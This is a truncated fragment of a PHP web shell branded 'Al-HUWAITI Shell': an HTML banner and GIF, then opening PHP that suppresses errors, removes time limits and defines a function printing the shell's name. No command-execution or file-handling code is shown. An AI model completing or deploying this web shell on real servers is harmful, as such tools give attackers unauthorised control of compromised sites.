...
<center>
<font face="Bungee" size="5">Al-HUWAITI Shell </font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center><img src="https://www.icegif.com/wp-content/uploads/2023/03/icegif-1710.gif" width="450" title="Al-huwaiti" alt="Al-huwaiti" class="center" />
<br><br><br>
<?php
set_time_limit(0);
error_reporting(0);
...
function author() {
	echo "<center><br>Al-HUWAITI Shell</center>";
	exit();
}
